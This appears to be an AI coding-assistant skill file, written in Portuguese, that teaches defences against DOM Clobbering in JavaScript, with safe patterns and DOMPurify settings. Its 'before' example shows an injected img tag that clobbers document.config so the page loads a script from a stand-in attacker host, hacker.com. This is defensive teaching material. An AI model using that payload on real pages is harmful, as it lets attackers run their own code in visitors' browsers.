---
name: rs-seguranca-devs-dom-clobbering-js
description: "Guards against DOM Clobbering vulnerabilities when writing front-end JavaScript code. Use when user asks to 'inject HTML', 'load scripts dynamically', 'set window or document variables', 'use getElementById', 'sanitize HTML input', or 'use DOMPurify'. Applies rules: never store config in document/window properties, never trust HTML injection even without JS, restrict form/id/name attributes in user content. Make sure to use this skill whenever generating code that reads from document or window properties, or allows any HTML injection. Not for backend security, SQL injection, or authentication topics."
---

# DOM Clobbering

> Nunca armazene configuracao em propriedades de `document` ou `window`, porque elementos HTML injetados podem sobrescreve-las silenciosamente.

## Rules

1. **Nunca use `document.config` ou `window.config`** — use `const` em escopo local do modulo, porque qualquer elemento HTML com atributo `name` ou `id` cria propriedades em `document` e `window` automaticamente (heranca do Netscape Navigator anos 90)
2. **Nunca permita injecao de HTML quando `innerText` resolve** — use `element.innerText` em vez de `innerHTML`, porque HTML injetado pode conter elementos que sobrescrevem variaveis do DOM
3. **Bloqueie atributos perigosos em HTML sanitizado** — `name`, `id` e `form` em inputs de usuario permitem DOM Clobbering e manipulacao de formularios
4. **DOMPurify nao e suficiente sozinho** — ele remove `<body>` e scripts, mas permite `id` em imagens e `name` em elementos, o que viabiliza DOM Clobbering
5. **Nunca permita o atributo `form` em HTML injetado** — um `<input form="meuForm">` fora do formulario se comporta como se estivesse dentro, permitindo injecao de campos hidden

## How to write

### Carregar scripts dinamicamente (SEGURO)

```typescript
// CORRETO: configuracao em escopo local, nunca em document/window
const config = {
  scriptToLoad: { src: '/scripts/meu-script.js' }
}

const script = document.createElement('script')
script.src = config.scriptToLoad.src
document.head.appendChild(script)
```

### Inserir conteudo de usuario (SEGURO)

```typescript
// CORRETO: usar innerText para conteudo de usuario
element.innerText = userInput

// Se HTML for necessario, sanitizar COM restricoes
import DOMPurify from 'dompurify'
const clean = DOMPurify.sanitize(userInput, {
  FORBID_ATTR: ['name', 'id', 'form'],
  FORBID_TAGS: ['form', 'input', 'button', 'textarea', 'select']
})
```

## Example

**Before (vulneravel a DOM Clobbering):**
```html
<img name="config" src="https://hacker.com/hack.js">

<script>
  // Atacante injetou <img name="config"> no HTML
  // document.config agora retorna o elemento <img>
  // document.config.src retorna "https://hacker.com/hack.js"
  const s = document.createElement('script')
  s.src = document.config.src  // CARREGA SCRIPT DO ATACANTE
  document.head.appendChild(s)
</script>
```

**After (com esta skill aplicada):**
```typescript
// Config em escopo local — impossivel sobrescrever via DOM
const appConfig = Object.freeze({
  scriptSrc: '/scripts/meu-script.js'
})

const s = document.createElement('script')
s.src = appConfig.scriptSrc
document.head.appendChild(s)
```

## Heuristics

| Situacao | Acao |
|----------|------|
| Precisa exibir texto do usuario | `innerText` sempre |
| Precisa renderizar HTML do usuario | DOMPurify com `FORBID_ATTR: ['name', 'id', 'form']` |
| Precisa carregar script dinamicamente | Config em `const` local, nunca em `document` ou `window` |
| Usa framework (React, Vue, Svelte, Angular) | Confie no framework — ele escapa por padrao |
| Precisa de template HTML dinamico | Use template engine do framework, nao `innerHTML` |

## Anti-patterns

| Nunca escreva | Escreva em vez disso |
|---------------|----------------------|
| `document.config = { src: '...' }` | `const config = { src: '...' }` |
| `window.appSettings = { ... }` | `const appSettings = { ... }` |
| `element.innerHTML = userInput` | `element.innerText = userInput` |
| `DOMPurify.sanitize(input)` (sem opcoes) | `DOMPurify.sanitize(input, { FORBID_ATTR: ['name','id','form'] })` |
| Permitir `<input form="x">` em conteudo injetado | Bloquear atributo `form` na sanitizacao |

## Deep reference library

- [deep-explanation.md](references/deep-explanation.md) — Raciocínio completo do instrutor, analogias e edge cases
- [code-examples.md](references/code-examples.md) — Todos os exemplos de código expandidos com variações


---

## Deep dive
- [Deep explanation](../../../data/skills/seguranca-para/rs-seguranca-para-devs-dom-clobbering-js/references/deep-explanation.md)
- [Code examples](../../../data/skills/seguranca-para/rs-seguranca-para-devs-dom-clobbering-js/references/code-examples.md)
